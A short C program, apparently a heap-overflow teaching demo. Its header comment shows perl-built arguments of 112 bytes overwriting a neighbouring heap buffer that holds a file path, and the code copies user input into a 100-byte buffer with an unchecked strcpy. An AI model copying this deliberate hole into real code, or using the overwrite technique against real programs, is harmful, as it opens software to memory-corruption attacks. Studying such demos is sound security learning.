/*± ./a.out test
 * [DEBUG] buffer     @ 0x107f008f0: 'test'
 * [DEBUG] datafile   @ 0x107f00960: '/tmp/notes'
 * gdb -q
 * p 0x107f00960 - 0x107f008f0
 * 112
 *
 * null-termination byte overflow into the beginning of the datafile buffer:
 *
 * ± ./a.out $(perl -e 'print "A"x112')
 * [DEBUG] buffer     @ 0x10a7008f0: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
 * [DEBUG] datafile   @ 0x10a700960: ''
 *
 * ± ./a.out $(perl -e 'print "A"x112 . "test"')
 * [DEBUG] buffer     @ 0x105b008f0: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest'
 * [DEBUG] datafile   @ 0x105b00960: 'test'
 * nice?
*/
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
   char *buffer, *datafile;
   buffer = malloc(100);
   datafile = malloc(20);
   strcpy(datafile, "/tmp/notes");
   if(argc < 2) {
      printf("usage: data\n");
      exit(0);
   }

   strcpy(buffer, argv[1]);

   printf("[DEBUG] buffer     @ %p: \'%s\'\n", buffer, buffer);
   printf("[DEBUG] datafile   @ %p: \'%s\'\n", datafile, datafile);

   return 0;
}

